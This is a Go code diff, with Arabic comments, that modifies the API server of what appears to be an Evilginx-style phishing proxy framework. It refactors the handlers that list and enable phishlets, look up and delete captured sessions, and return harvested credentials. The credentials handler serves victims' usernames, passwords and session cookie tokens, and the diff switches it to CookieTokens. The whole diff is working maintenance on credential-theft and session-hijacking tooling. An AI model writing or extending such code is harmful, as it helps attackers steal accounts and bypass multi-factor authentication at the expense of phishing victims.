@@ -3,7 +3,6 @@ package core
 import (
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"strconv"
@@ -683,13 +682,13 @@ func (as *ApiServer) phishletHandler(w http.ResponseWriter, r *http.Request) {
 // تعديل معالج قائمة الـ phishlets لاستخدام نموذج البيانات الجديد
 func (as *ApiServer) phishletsHandler(w http.ResponseWriter, r *http.Request) {
 	// الحصول على معلومات جميع الـ phishlets
-	phishlets := as.cfg.GetPhishlets()
+	phishlets := as.cfg.phishlets
 	apiPhishlets := make([]ApiPhishlet, 0)
 
-	for _, phishlet := range phishlets {
-		if !as.cfg.IsSiteHidden(phishlet.Name) {
-			hostname, _ := as.cfg.GetSiteDomain(phishlet.Name)
-			isActive := as.cfg.IsSiteEnabled(phishlet.Name)
+	for name, phishlet := range phishlets {
+		if !as.cfg.IsSiteHidden(name) {
+			hostname, _ := as.cfg.GetSiteDomain(name)
+			isActive := as.cfg.IsSiteEnabled(name)
 			
 			apiPhishlet := ApiPhishlet{
 				Name:        phishlet.Name,
@@ -723,7 +722,7 @@ func (as *ApiServer) phishletEnableHandler(w http.ResponseWriter, r *http.Reques
 	}
 
 	// التحقق مما إذا كان الـ phishlet مُفعل بالفعل
-	if pl.IsActive {
+	if as.cfg.IsSiteEnabled(name) {
 		as.jsonResponse(w, ApiResponse{
 			Success: true,
 			Message: fmt.Sprintf("الـ phishlet '%s' مُفعل بالفعل", name),
@@ -732,7 +731,8 @@ func (as *ApiServer) phishletEnableHandler(w http.ResponseWriter, r *http.Reques
 	}
 
 	// التحقق من hostname
-	if pl.Hostname == "" {
+	hostname, ok := as.cfg.GetSiteDomain(name)
+	if !ok || hostname == "" {
 		as.jsonError(w, fmt.Sprintf("لم يتم تعيين hostname للـ phishlet '%s'", name), http.StatusBadRequest)
 		return
 	}
@@ -1053,7 +1053,7 @@ func (as *ApiServer) healthHandler(w http.ResponseWriter, r *http.Request) {
 // dashboardHandler لإحصائيات لوحة التحكم
 func (as *ApiServer) dashboardHandler(w http.ResponseWriter, r *http.Request) {
 	// جمع البيانات للوحة التحكم
-	phishlets := as.cfg.GetPhishlets()
+	phishlets := as.cfg.phishlets
 	lures := as.cfg.lures
 	
 	// الحصول على الجلسات
@@ -1105,13 +1105,30 @@ func (as *ApiServer) sessionsHandler(w http.ResponseWriter, r *http.Request) {
 // sessionHandler لجلب تفاصيل جلسة محددة
 func (as *ApiServer) sessionHandler(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
-	id := vars["id"]
+	idStr := vars["id"]
 	
 	// التحقق من طريقة الطلب
 	if r.Method == "GET" {
 		// الحصول على الجلسة
-		session, err := as.db.GetSession(id)
+		sessions, err := as.db.ListSessions()
 		if err != nil {
+			as.jsonError(w, "فشل في استرجاع الجلسات", http.StatusInternalServerError)
+			return
+		}
+		
+		// محاولة تحويل المعرف إلى رقم (إذا كان رقميًا)
+		idInt, err := strconv.Atoi(idStr)
+		
+		// البحث عن الجلسة بالمعرف (نبحث بكلا الطريقتين: المعرف الرقمي والمعرف النصي)
+		var session *database.Session
+		for _, s := range sessions {
+			if (err == nil && s.Id == idInt) || s.SessionId == idStr {
+				session = s
+				break
+			}
+		}
+		
+		if session == nil {
 			as.jsonError(w, "الجلسة غير موجودة", http.StatusNotFound)
 			return
 		}
@@ -1122,10 +1139,17 @@ func (as *ApiServer) sessionHandler(w http.ResponseWriter, r *http.Request) {
 			Data: session,
 		})
 	} else if r.Method == "DELETE" {
-		// حذف الجلسة
-		err := as.db.DeleteSession(id)
+		// تحويل المعرف إلى رقم
+		sessionId, err := strconv.Atoi(idStr)
 		if err != nil {
-			as.jsonError(w, "فشل في حذف الجلسة", http.StatusInternalServerError)
+			as.jsonError(w, "معرف الجلسة غير صالح", http.StatusBadRequest)
+			return
+		}
+		
+		// حذف الجلسة
+		err = as.db.DeleteSessionById(sessionId)
+		if err != nil {
+			as.jsonError(w, "فشل في حذف الجلسة: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		
@@ -1155,7 +1179,7 @@ func (as *ApiServer) credsHandler(w http.ResponseWriter, r *http.Request) {
 				"phishlet": session.Phishlet,
 				"username": session.Username,
 				"password": session.Password,
-				"tokens": session.Tokens,
+				"tokens": session.CookieTokens,  // استخدام CookieTokens بدلاً من Tokens
 				"remote_addr": session.RemoteAddr,
 				"time": session.UpdateTime,
 			}
